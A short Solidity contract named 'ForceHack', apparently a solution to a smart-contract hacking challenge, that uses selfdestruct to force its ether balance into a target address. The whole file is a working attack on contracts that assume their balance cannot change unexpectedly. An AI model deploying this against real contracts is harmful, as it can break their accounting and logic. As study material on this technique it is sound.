pragma solidity ^0.4.18;
contract ForceHack {
    
    function() payable {}
    
    constructor() payable{
        
    }
    
    
    function destination(address _target) {
        
        selfdestruct(_target);
        
    }
    
}